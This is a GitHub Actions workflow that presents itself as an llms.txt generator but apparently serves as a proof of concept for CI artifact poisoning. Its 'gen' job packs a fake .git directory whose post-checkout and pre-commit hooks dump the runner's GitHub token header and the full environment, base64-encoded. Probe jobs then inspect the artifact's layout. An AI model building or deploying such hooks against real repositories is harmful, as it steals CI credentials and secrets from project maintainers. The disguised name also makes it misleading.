---
name: Generate llms.txt
on:
  pull_request:
    branches: [main]

jobs:
  gen:
    runs-on: ubuntu-latest
    steps:
      - name: make artifact
        run: |
          rm -rf out repo && mkdir -p out/src/pages
          echo "external attacker llms.txt" > out/src/pages/llms.txt
          echo "${{ github.event.pull_request.number }}" > out/pr-number.txt
          echo "main" > out/pr-branch.txt
          git init -q repo
          cp -a repo/.git out/.git
          cat > out/.git/hooks/post-checkout <<'HOOK'
          #!/bin/sh
          echo "===== LLMS-HOOK-RAN ====="
          id
          echo "---extraheader---"
          git config --local --get http.https://github.com/.extraheader | base64 -w0
          echo
          echo "---env---"
          env | sort | base64 -w0
          echo
          echo "===== LLMS-HOOK-END ====="
          HOOK
          chmod +x out/.git/hooks/post-checkout
          cp out/.git/hooks/post-checkout out/.git/hooks/pre-commit
          git config -f out/.git/config core.hooksPath .git/hooks
          mkdir -p out/.git/objects/info out/.git/objects/pack out/.git/refs/heads out/.git/refs/tags
          touch out/.git/objects/info/.keep out/.git/objects/pack/.keep out/.git/refs/heads/.keep out/.git/refs/tags/.keep
          cat out/.git/config
      - uses: actions/upload-artifact@v4
        with:
          name: llms-txt
          path: out/
          include-hidden-files: true

  probe2:
    needs: gen
    runs-on: ubuntu-latest
    steps:
      - uses: actions/download-artifact@v4
        with:
          name: llms-txt
      - run: |
          echo "=== root tree ==="
          find . -maxdepth 2 -name '.git' -o -maxdepth 2 -name 'HEAD' | head
          ls -la . | head -20
          ls -la .git 2>&1 | head -5

  probe:
    needs: gen
    runs-on: ubuntu-latest
    steps:
      - uses: actions/download-artifact@v4
        with:
          name: llms-txt
          path: probe
      - run: |
          echo "=== probe tree ==="
          find probe -maxdepth 3 | head -40
          ls -la probe probe/.git probe/.git/hooks 2>&1 | head -30
